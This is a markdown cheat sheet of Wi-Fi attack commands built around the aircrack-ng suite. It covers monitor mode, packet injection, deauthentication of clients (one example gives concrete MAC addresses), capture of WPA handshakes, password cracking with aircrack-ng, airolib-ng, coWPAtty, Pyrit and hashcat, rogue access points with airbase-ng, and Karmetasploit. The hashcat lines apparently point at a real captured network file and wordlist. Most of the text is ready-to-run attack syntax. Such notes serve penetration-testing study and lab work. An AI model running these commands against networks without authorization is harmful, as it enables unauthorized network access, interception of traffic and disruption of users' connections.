# Wifi attacks

## Loading and unloading drivers

```ShellSession
$ iw list
nl80211 not found.
```

To load the mac80211 driver for the Alfa, you will first need to unload the current driver

```ShellSession
>> rmmod r8187
```

Now you can load the newer drive for the wifi card using

```ShellSession
>> modprobe rtl8187
```

## Monitor Mode

To see the channel numbers and corresponding frequencies that your wireless interface is able to detect, you can run `iwlist` using the `frequency` parameter.

```ShellSession
>> iwlist <interface name> frequency
```

To get a listing of wireless access points that are within range of your wireless card

```ShellSession
>> iw dev <interface name> scan | egrep "DS\ Parameter\ set|SSID"
```

Create a new Virtual Access Point (VAP), named “mon0” that will be in monitor mode using the following syntax:

```ShellSession
>> iw dev <interface name> interface add mon0 type monitor
```

With the new interface created, it next needs to be brought up.

```ShellSession
>> ifconfig mon0 up
```

Double check that mon0 has a Mode:Monitor

```ShellSession
>> iwconfig mon0
```

Once you have done with you VAP you can destroy it with

```ShellSession
>> iw dev mon0 interface del
```

## Aircrack-ng Essentials

### Airmon-ng

- Show current wireless iterface status

```ShellSession
>> airmon-ng
```

#### Usage

```ShellSession
>> airmon-ng <start | stop> <interface name> [channel]
OR
>> airmon-ng <check |  check-all>
```

- If airodump-ng, aireplay-ng or airtun-ng stops working after a short period of time, you may want to run

```ShellSession
>> airmon-ng check kill`
```

- You can place these cards into monitor mode with the following syntax:

```ShellSession
>> airmon-ng start <interface name>
```

- To stop and remove the monitor mode interface, Airmon-ng is run with the following usage:

```ShellSession
>> airmon-ng stop <interface name>
```

- In order to start monitor mode on a specific channel, and to stop the wireless interface from channel hopping, you can pass an optional channel number as a parameter.

```ShellSession
>> airmon-ng start <interface name> [channel number]
```

- To check that it's working on the desired channel

```ShellSession
>> iwlist <interface name> channel
```

- Some wireless cards, particularly those with Atheros chipsets, use Madwifi-ng drivers and behave differently when it comes to placing them into monitor mode. These cards tend to have a wireless interface name of **wifi0** and a VAP name of **ath0**.

## Airodump-ng

Airodump-ng is used for the packet capture of raw 802.11 frames and is particularly suitable for collecting weak WEP Initialization Vectors (IVs) for the later use with Aircrack-ng. With a GPS receiver connected to the computer, Airodump-ng is also capable of logging the GPS coordinates of the detected APs. This GPS data can then be imported into a database and online maps in order to map the locations of the access points geographically.

```ShellSession
>> airodump-ng <options><interface name>[,<interface name>,...]

# Options
-w <prefix>    : Saves the capture dump to the specified filename
--bssid <bssid>  : Filters Airodump-ng to only capture the specified BSSID
-c <channel>  :  Forces Airodump-ng to only capture the specified channel
```

- Sniffing with Airodump-ng. (Prior to running Airodump-ng, your wireless card needs to be in monitor mode).

```ShellSession
>> airodump-ng <interface name>
```

### Precision Airodump-ng sniffing

1. Start the VAP in the same channel as your target

```ShellSession
>> airmon-ng start <interface name> [channel]
e.g.
>> airmon-ng start wlan0 6
```

2. Sniff packets from a specific target ESSID

```ShellSession
airodump-ng -c <Channel> --bssid <BSSID> -w <Capture><interface name>
```

## Aireplay-ng

Aireplay-ng is primarily used to generate or accelerate wireless traffic for the later use with Aircrack-ng to crack WEP and WPA-PSK keys.

Aireplay-ng supports the following attacks along with their corresponding numbers:

Attack #   |  Attack Name
---|--------------------
0  |  Deauthentication
1  |   Fake Authentication
2  |   Interactive Packet Replay
3  |   ARP Request Replay Attack
4  |   KoreK ChopChop Attack
5  |   Fragmentation Attack
6  |  Café-Latte Attack
7  |   Client-Oriented Fragmentation Attack
9  |   Injection Test

```ShellSession
aireplay-ng <options><interface name>
```

### Aireplay-ng Filter Options

For all attacks, with the exception of deauthentication and fake authentication, you may use the following filters to limit the packets that will be used in the attack. The most commonly used filter option is `-b` to single out a specific AP.

Option | Description
----------|-------------------
-b   |  bssid MAC address, Access Point
-d   |  dmac MAC address, Destination
-s   |  smac MAC address, Source
-m   |  len Minimum Packet Length
-n   |  len Maximum Packet Length
-u   |  type Frame control, type field
-v   |  subt Frame control, subtype field
-f   |  fromds Frame control, From DS bit
-w   |  iswep Frame control, WEP bit

### Aireplay-ng Replay Options
When replaying (injecting) packets, the following options apply. Bear in mind that not every option is relevant for every attack. The specific attack documentation provides examples of the relevant options.

Option | Description
---------|------------------
-x nbpps |  Number of packets per second
-p fctrl | Set frame control word (hex)
-a bssid | Access point MAC address
-c dmac | Destination MAC address
-h smac | Source MAC address
-e essid | Target AP SSID
-j | arpreplay attack: inject FromDS packets
-g value | Change ring buffer size (default: 8)
-k IP | Destination IP in fragments
-l IP | Source IP in fragments
-o npckts | Number of packets per burst (-1)
-q sec | Seconds between keep-alives (-1)
-y prga | Keystream for shared key authentication
-B | Bit rate test
-D | Disable AP detection
-F |Chooses first matching packet
-R |Disables /dev/rtc usage

### Aireplay-ng Source Options

The Aireplay-ng attacks can obtain packets from two sources. The first source is a live flow of packets from your wireless card whereas the second source is from a pre-captured pcap file. The standard pcap format (http://www.tcpdump.org) is recognized by most commercial and open-source traffic capture and analysis tools. Reading from a file is an often-overlooked feature of Aireplay-ng.

Option | Description
----------|------------------
-i iface | Capture packets from the interface
-r file |  Extract packets from a file

### Aireplay-ng Attack Modes

The following attack modes are specified with the following switches. Numbers can be used instead of the attack names.

Option | Description
----------|------------------
--deauth count (-0) | De-authenticate 1 or all stations
--fakeauth delay (-1) | Fake authentication with the AP
--interactive (-2) | Interactive frame selection
--arpreplay (-3) | Standard ARP request replay
--chopchop (-4) | Decrypt/chopchop WEP packet
--fragment (-5) | Generates a valid keystream
--caffe-latte (-6) | Query a client for new IVs
--cfrag (-7) | Fragments against a client
--migmode (-8) | Attacks WPA migration mode
--test (-9) | Tests injection and quality

### Optimizing Aireplay-ng Injection Speeds

If you are too far from the AP, try lowering the rates (i.e.: `iwconfig wlan0 rate 1M`) and then try increasing them gradually.

### Injection Test

The first, and arguably most important, Aireplay-ng option we will explore is attack 9, the injection test.

The injection test determines if your card can successfully inject wireless packets and it measures ping response times to access points. The percentage of responses received gives a good indication of the link quality. If you have two wireless cards connected, the test can also determine which specific injection attacks can be successfully executed.

The basic injection test lists the access points in the area that respond to broadcast probes.

For each of the access points found, it performs a 30-packet test to measure the connection quality. This connection quality quantifies the ability of your card to successfully send and receive a response to the test target.

```ShellSession
>> aireplay-ng -9 -e <ESSID> -a <AP MAC> -i <interface><interface name>

Where:
- -9: injection test
- -e: optional ESSID (network name)
- -a: optional AP MAC address
- -i: optional interface name for the two card injection test
- <interface name>: the interface name to use for the test
```

**Important:** You must set your card to the desired channel with Airmon-ng prior to running any of the tests.

#### Basic Injection Test

The basic injection test determines if your card successfully supports injection. As mentioned earlier, the wireless card must first be in monitor mode

```ShellSession
>> airmon-ng start <interface name> [channel]
```

Next, the basic injection test is launched using the following syntax:

```ShellSession
>> aireplay-ng -9 <interface name>
```

You can run the injection test against a hidden or specific SSID by using the following syntax:

```ShellSession
aireplay-ng -9 -e <ESSID> -a <AP MAC><interface name>
```

#### Card-to-Card (Attack) Injection Test

The card-to-card injection test is a far more robust check that also tests for the ability of the card to implement various Aireplay attacks. This test has the following syntax where the

interface specified with `-i` is the interface that acts as the access point:

```ShellSession
aireplay-ng -9 -i <input interface><interface name>
```

## Aireplay-ng De-authentication Attack

Disassociating clients can be beneficial in a number of situations:

- Recovering a cloaked/hidden ESSID
- Capturing WPA/WPA2 4-way handshakes by forcing clients to re-authenticate
- Generating ARP requests (Windows clients often flush their ARP cache when disconnected)

Naturally, this attack is **completely useless** if there are no associated wireless clients on the network.

The de-authentication attack has the following usage:

```ShellSession
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC><interface name>

Where:

- -0: de-authentication attack
- 1: the number of de-auths to send. 0 means to send continuously
- -a: MAC address of the AP
- -c: MAC address of the client to deauthenticate. if this is omitted, all clients will be de-authenticated
- \<interface name>: your monitor mode interface name
```

### Usage Tips:

- It is more effective to target a specific station using the -c parameter.
- The de-authentication packets are sent directly from your PC to the client. You must be physically close enough to the client for your wireless transmissions to reach it.

## Aircrack-ng

```ShellSession
>> aircrack-ng [options] <capture file(s)>
```

You can specify multiple input files in either .cap or .ivs format and in addition, you can run both Airodump-ng and Aircrack-ng at the same time. Aircrack-ng will auto-update when new IVs are available

Listed below are the many options that Aircrack-ng supports.
Option| Param| Description
-----|----|---------
-a |amode| Force attack mode (1=static WEP, 2=WPA/WPA2-PSK)
-e |essid| If set, all IVs from the specified ESSID will be used
-b |bssid| Select the target network based on the AP MAC address
-p |nbcpu| On SMP systems, the number of CPUs to use
-q |none| Enable quiet mode
-C| macs| In WEP cracking, merge the given APs to a virtual one
-c |none| In WEP cracking, restrict the search to alpha-numeric characters
-t| none| In WEP cracking, restrict the search to binary coded decimal hex
-h |none| In WEP cracking, restrict the search to numeric characters
-d |start| Set the beginning of the WEP key in hex
-m| maddr| MAC address to filter WEP data packets
-n |nbits| Specify the length of the WEP key. 64=40-bit WEP, 128=104-bit
-i|index| Only keep IVs with the specified key index (1 to 4)
-f| fudge| By default, this is set to 2 for 104-bit WEP and 5 for 40-bit WEP
-k |korek| Specify one of the 17 korek statistical attacks
-x/-x0 |none| Disable last key bytes brute force
-x1 |none |Enable last key byte brute force (default)
-x2| none| Enable last two key bytes brute force
-y| none| For WEP, enable experimental single brute force attack
-u| none| Provide information on the number of CPUs and MMX support
-K| none| Use the KoreK attack instead of PTW
-s| none |Shows the key in ASCII while cracking
-M |number| Specify the maximum number of IVs to use
-D |none| WEP decloak, skips broken keystreams
-P| number| PTW debug. 1: disable Klein 2: PTW
-1 |none| Run only 1 try to crack key with PTW
-w| words| Path to a word list
-r| DB path |Path to the airolib-ng database

### Cracking WPA using aircrack-ng

After capturing the 4-way handshake we can use aircrack-ng to crack the wifi password

```ShellSession
>> aircrack-ng -w <wordlist> <capture file pcap>
```

## Airolib-ng

Airolib-ng is a tool designed to store and manage ESSID and password lists, compute their Pairwise Master Keys (PMK), and use them in order to crack WPA and WPA2 passwords.

 It allows us to pre-compute the PMK for given combinations and speed up the cracking of the WPA/WPA2 handshake. Using this technique, Aircrack-ng can check more than 50000 passwords per second using pre-computed PMK tables.

```ShellSession
>> airolib-ng <database><operation> [options]
Where:
- <database>: the name of the database
- <operation>: specifies the action to take on the database
- [options]: options may be required depending on the operation specified
```

The following table is a summary of the operations that are available with Airolib-ng:

Operation | Description
-------|------
--stats | Output information about the database.
--sql {sql} | Execute the specified SQL statement.
--clean [all] | Clean the database of old junk. The option `all` will reduce file size if possible and run an integrity check.
--batch | Batch-process all combinations of ESSIDs and passwords.
--verify [all] | Verify a set of randomly selected PMKs. If the `all` option is used, all PMKs in the database are verified and incorrect ones are deleted.
--export cowpatty {essid} {file} | Export to a cowpatty file.
--import cowpatty {file} | Import a cowpatty file and create the database if it does not exist.
--import {essid\|passwd} {file} | Import a text file of either ESSIDs or passwords and create the database if it does not exist. The file must contain one ESSID or password per line

### Using Airolib-ng

To begin using Airolib-ng, we first need to create a text file containing the ESSID of our target access point.

```ShellSession
>> echo wifu > essid.txt
```

The next step is to import the ESSID text file into the Airolib database using the following syntax. If the database doesn`t already exist, it will be created automatically as shown below.

```ShellSession
>> airolib-ng <db name> --import essid <essid filename>
```

Passing the `--stats` operation to Airolib-ng displays information about our database,
including the ESSIDs and number of passwords that are stored.

```ShellSession
>> airolib-ng <db name> --stats
```

In the output above, we have our ESSID imported successfully but the database does not contain any passwords yet. We will import the small wordlist included with John the Ripper using the following syntax:

```ShellSession
>> airolib-ng <db name> --import passwd <wordlist>
```

With the network ESSID and password list imported, we can have Airolib generate all of the corresponding PMKs for us. These PMKs, once generated, can then be used against access points that have the same ESSID.

```ShellSession
>> airolib-ng <db name> --batch
```

Once the batch operation is complete, the output of the `--stats` operation shows that all possible combinations have been computed for our ESSID/password combination.

Now, instead of using a wordlist with Aircrack-ng, we can pass the database name using the `-r` parameter instead.

```ShellSession
>> aircrack-ng -r <db name><capture>
```

## Cracking WPA with JTR and Aircrack-ng

Before we get started with John the Ripper, we first need to capture a WPA 4-way handshake for our access point. After putting our card into monitor mode and starting an Airodump capture, we deauthenticate the connected client

```ShellSession
>> ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
```

## Cracking WPA with coWPAtty

coWPAtty is a versatile tool that can recover WPA pre-shared keys using both dictionary and rainbow table attacks. Although it is not being actively developed, it is still quite useful, especially when using its rainbow table attack method.

## coWPAtty Dictionary Mode

Even though dictionary mode is not the main method that people tend to use with coWPAtty, it is still good to know how to use it and see how much slower it is when compared to using pre-computed hashes.

You need to first capture the handshake using airodump-ng.

```ShellSession
>> cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
Where:
- -r: the capture filename
- -f: the wordlist to use
- -2: use non-strict mode as coWPAtty has an issue with Airodump captures
- -s: the network ESSID
```

## coWPAtty Rainbow Table Mode

The main purpose behind using coWPAtty is to make use of pre-computed hashes, similar to Airolib-ng, to crack WPA passwords. Using these pre-computed hashes, frequently called rainbow tables, significantly reduces the time required to crack WPA passwords as all of the computation is done ahead of time.

An important point to keep in mind when using pre-computed hashes is that they need to be generated for each unique ESSID. The ESSID is combined with the WPA pre-shared key to create the hash so the hashes for the ESSID of wifu will not be the same as those for linksys or dlink.

As we did with Airolib-ng, we first need to generate the hashes for our ESSID along with a dictionary file containing passwords. coWPAtty includes a tool, genpmk, that can be used to generate the required rainbow tables. It has the following syntax:

```ShellSession
>> genpmk -f <wordlist> -d <output filename> -s <ESSID>
Where:
- -f: the path to the dictionary file
- -d: the filename to save the computed hashes to
- -s: the network ESSID
```

To run coWPAtty using the generated hashes, you use the `-d` parameter rather than `-f`
as you do when running it in wordlist mode.

```ShellSession
>> cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
```

## Cracking WPA with Pyrit (Using GPU to generate PMK)

Pyrit also has the ability to read in packets from a raw or compressed packet capture file or even from a wireless interface.

We will use Pyrit to capture the 4-way handshake. After placing our wireless card in monitor mode:

```ShellSession
>> pyrit -r <interface> -o <capture> stripLive

stripLive: only save WPA handshakes instead of every packet that it sees.
```

Pyrit does not have a mechanism to deauthenticate wireless clients so we deauthenticate our victim wireless client using Aireplay-ng

```ShellSession
>> aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0
```

### Pyrit Dictionary Attack

- Checking if the capture file contains any valid handshake (In case of the capure file is captured using pyrit with stipLive)

```ShellSession
>> pyrit -r <capture> analyze
```

- In case of the capture file is captured with another tool we first need to strip it

```ShellSession
>> pyrit -r <original capture> -o <new capture> strip
```

- Now we can run the basic dicctionary attack (which is almost is the same speed as aircrack-ng):

```ShellSession
>>  pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough

Where:
- -r: the capture file containing one or more WPA handshakes
- -i: the path to the dictionary file
- -b: optional BSSID of the target AP
- attack_passthrough:attempt to crack the WPA password using the wordlist
```

## Pyrit Database Mode

- With an initial Pyrit installation, its database will be empty. You can view the database status by running Pyrit with the eval parameter as shown below

```ShellSession
>> pyrit eval
```

- With our fresh installation, our database does not contain any ESSIDs or passwords. We can remedy this by first importing a wordlist into the database.

```ShellSession
>> pyrit -i <wordlist> import_passwords
```

- Before Pyrit can compute PMKs, we need to import an ESSID into the database using the create_essid parameter:

```ShellSession
>> pyrit -e <ESSID> create_essid
```

- compute the pairwise master keys for our access point.

```ShellSession
>> pyrit batch
```

 we can finally launch Pyrit in database mode and crack our WPA password.

```ShellSession
>> pyrit -r <capture>-b <AP MAC>attack_db
```

## Cracking WPA/WPA2 using hashcat

```ShellSession
>> ./cap2hccapx.bin /media/anas/DATA/pentest/payloads/TEdata3791A7-02.cap /media/anas/DATA/pentest/payloads/TEdata3791A7-02__.hccapx
```

```ShellSession
>> ./hashcat64.bin -m 2500 /media/anas/DATA/pentest/payloads/TEdata3791A7-02__.hccapx /media/anas/DATA/pentest/payloads/anas/eg_vodafone.com
```

## Airdecap-ng

Once you have successfully retrieved the key to a wireless network, you can then use Airdecap-ng to decrypt WEP, WPA, or WPA2 capture files. It can also be used to strip the wireless headers from an unencrypted wireless capture.

```ShellSession
>> airdecap-ng [options] <capture>
```

Option | Param |Description
-------| --------| ----------
-l ||Don`t remove the 802.11 header
-b |bssid |AP MAC address filter
-k |pmk | WPA/WPA2 PMK in hex
-e |essid |Target network ESSID
-p |pass| Target network WPA passphrase
-w |key |Target network WEP key in hex

## Removing Wireless Headers

We will remove the wireless headers from the open network capture displayed above, using the following syntax:

```ShellSession
>> airdecap-ng -b <AP MAC><capture>
```

## Decrypting WPA Captures

```ShellSession
>> airdecap-ng -e <ESSID> -p <WPA Password> -b <AP MAC><capture>
```

## Airserv-ng

 It is a wireless card server that allows multiple wireless applications to use a wireless card via a client-server TCP connection. your card needs to be in monitor mode.

Airserv-ng has the following usage syntax:
```ShellSession
>> airserv-ng <options>
Where:
- -p <port>: TCP port to listen on. Defaults to 666
- -d <dev>: wifi device to serve on the network
- -c <chan>: channel number to start the server on
- -v <level>: debug level
```

## Airtun-ng

Airtun-ng is a virtual tunnel interface creator that provides two basic functions:

- Allows all encrypted traffic to be monitored for wireless Intrusion Detection System (wIDS) purposes.
- Injects arbitrary traffic into a network.

```ShellSession
>> airtun-ng <options><interface>
```

The available options are summarized in the table below.
Option| Param| Description
----------|------|-----------
-x |nbpps |Maximum number of packets per second (optional)
-a |bssid| AP MAC address (mandatory)
-i |iface| Capture interface (optional)
-y |file| PRGA filename (optional but either -y or -w must be defined)
-w |wepkey| WEP key (optional but either -y or -w must be defined)
-t |tods| Send frames to AP (1) or client (0) (optional - defaults to 0)
-r |file| Read frames from a pcap file (optional)

The following are Airtun-ng`s repeater options. All require double dashes.

Option| Param| Description
--------|---------|--------
--repeat || Activates repeat mode
--bssid |\<mac> |BSSID to repeat
--netmask |\<mask>| Netmask for BSSID filter

## Wireless Reconnaissance

### Airgraph-ng

Airgraph-ng is a Python script that creates graphs of wireless networks using the CSV files that are generated by Airodump-ng.

Airgraph-ng creates two types of graphs:

- Clients to AP Relationship (CAPR)
- Clients Probe Graph (CPG)

To generate a CAPR graph, we use the following syntax:

```ShellSession
>> airgraph-ng -i <csv filename> -g CAPR -o <output filename>
```

The CPG graph type can be generated with the following

```ShellSession
>> airgraph-ng -i <csv filename> -g CPG -o <output filename>
```

### Kismet

Kismet28 is a feature-rich and versatile wireless network detector, sniffer, and intrusion detection system.

### GISKismet

GISKismet29 is a Perl application that allows you to use the data gathered with Kismet coupled with a GPS receiver and generate Google Earth compatible KML files.

GISKismet stores the information from the Kismet netxml files in a SQLite database so you can use SQL queries to filter out specific information to display.

Naturally, in order to use GISKismet, you need to have a Kismet capture with GPS data included in it.

Depending on your GPS receiver, GPSd31 might start automatically as soon as you plug it into your computer.

If you prefer to view the debugging output as GPSd is running, you can find and kill the process and re-launch GPSd with the following command:

```ShellSession
>> gpsd -n -N -D4 /dev/ttyUSB0
Where:
- -n: Do not wait for clients before polling
- -N: Do not background the GPSd process
- -D4: Set the debugging level to 401
```

With GPSd running, you can then launch and configure Kismet. It will automatically detect your GPS device so you are then ready to go for a walk or a drive and see what networks are detected in your travels.

Once you have finished your Kismet sniffing session, you will notice you have a filename with a .netxml extension:

This file contains all of the GPS data that GISKismet needs in order to map out the access points that Kismet detected. To import the file into GISKismet, we use the following syntax:

```ShellSession
>> giskismet -x <filename>
```

You will see a large string of output being displayed as GISKismet imports the various BSSIDs that were detected by Kismet. With the BSSIDs and geographic coordinates stored in the database, SQL queries can be run to pull out the information you are looking for.

Queries are made as follows:

```ShellSession
>> giskismet -q <”SQL Query”> -o <output filename>

```

## Rogue Access Points

Many times, rather than attacking the APs and attempting to recover WEP or WPA keys, you would rather convince wireless clients to connect back to your attacking system.

This is where rogue access points come into play.

### Airbase-ng

Airbase-ng is a multi-purpose tool designed to attack clients as opposed to the access point itself. Some of its many features are:

- Implements the Caffe Latte and Hirte WEP client attacks
- Causes the WPA/WPA2 handshake to be captured
- Can act as an ad-hoc or full access point
- Has the ability to filter by SSID or client MAC addresses
- Can manipulate and resend packets
- Has the ability to encrypt sent packets and decrypt received packets

The main idea behind using Airbase-ng is that it should encourage wireless clients to associate with the fake AP and not prevent them from accessing legitimate ones.

It is important to note that Airbase-ng can very easily disrupt real access points nearby so it is recommended that you use filters to minimize its impact.

```ShellSession
>> airbase-ng <options><replay interface>
```
The table below summarizes the various options of Airbase-ng.

Option| Param |Description
-----|-------|:----------
-a| bssid| set the AP MAC address
-i| iface| Capture packets from the specified interface
-w| WEP key| Use the provided WEP key to encrypt/decrypt packets
-h| MAC Source| MAC for MITM mode
-f| disallow| Disallow specified client MACs
-W| 0/1| [Don`t] set WEP flag in beacons (default: auto)
-q| Quiet| (do not print statistics)
-v| Verbose| (print more messages)
-A| Ad-Hoc mode| (allows other clients to peer)
-Y| in/out/both| External packet processing
-c| channel| Set the AP channel
-X|| Hidden ESSID
-s| |Force shared key authentication
-S| |Set shared key challenge length (default: 128)
-L| |Caffe-Latte attack
-N| |Hirte attack (cfrag attack)
-x|| nbpps Number of packets per second (default: 100)
-z| type| Sets WPA1 tags. 1=WEP40, 2=TKIP, 3=WRAP, 4=CCMP, 5=WEP104
-Z| type| Same as -z, but for WPA2
-V| type| Fake EAPOL. 1=MD5, 2=SHA1, 3=Auto

Airbase-ng also has the following filter options:

Option| Param| Description
------|-------|:----------------
--bssid| MAC| BSSID to filter
--bssids| file| Read a list of BSSIDs from the given file
--client| MAC| MAC address of the client to accept
--clients| file| Read a list of clients from the given file
--essid| ESSID |Specify a single ESSID
--essids| file| Read a list of ESSIDs from the given file

### Airbase-ng Shared Key Capture

Rather than using the chopchop or fragmentation attacks, you can capture the PRGA from a client by setting up a fake access point as follows.

```ShellSession
>> airbase-ng -c <Channel> -e <ESSID> -s -W 1 <interface>

Where:
-c: Specifies the channel to transmit on
-e: Filters a single SSID
-s: Forces shared key authentication
-W 1: Forces the beacons to specify WEP
```

### Airbase-ng WPA Handshake Capture

In addition to being able to capture PRGA files, Airbase-ng can also be configured to capture the WPA 4-way handshake from victim clients.

```ShellSession
>> airbase-ng -c <Channel> -e <ESSID> -z 2 -W 1 <interface>

Where:
-c: Specifies the fake AP channel
-e: Filters to a single SSID
-z 2: Specifies TKIP
-W 1: Sets the WEP flag. Some clients get confused if this is not set
```

Note that the `-z` type may have to be changed depending on the cipher you believe the client will be using. TKIP is typical for WPA. For WPA2 CCMP, you would use `-z 4`.

### Karmetasploit

Karmetasploit is one of the most sinister attack vectors available when it comes to wireless networking.

It uses a combination of the Karma attack, the Aircrack-ng suite, and the Metasploit exploitation framework.

Karma takes advantage of the insecure nature of wireless clients by responding to all probe requests sent out by them.

Once a victim client is associated with the malicious access point, a wide range of attacks can be launched against it.

Karmetasploit takes this attack to the next level by launching a wide array of man in the middle attacks and exploits at the client once it connects to the rogue access point
